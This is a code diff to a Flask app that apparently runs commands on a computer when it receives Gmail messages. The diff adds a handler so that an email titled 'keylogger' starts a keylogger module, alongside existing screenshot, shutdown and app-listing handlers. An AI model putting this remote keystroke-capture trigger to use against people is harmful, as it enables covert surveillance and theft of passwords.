@@ -16,6 +16,7 @@ from googleapiclient.errors import HttpError
 
 from registry import Registry as reg
 import shutdown_logout as sl
+import keylogger as kl
 app = Flask(__name__)
 
 # If modifying these scopes, delete the file token.json.
@@ -90,6 +91,8 @@ def Process(Subject,rawMsg):
     elif Subject.lower() == "get list application" or rawMsg[:-2] == "get list application":
         filename = get_list_app()
         res = ["2",filename]
+    elif Subject.lower() == "keylogger":
+        res = kl.RunKeylogger(rawMsg)
     else:
         return ["0","invalid Subject"]
     return res  
@@ -228,7 +231,6 @@ def capture_screen():
     # Save the image
     file_name = f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
     image.save(file_name)
-
     return file_name
 
 
@@ -295,5 +297,3 @@ def receiveGmailNotification():
 if __name__ == '__main__':
     main()
     app.run(debug=True, host='localhost', port=3333)
-
-
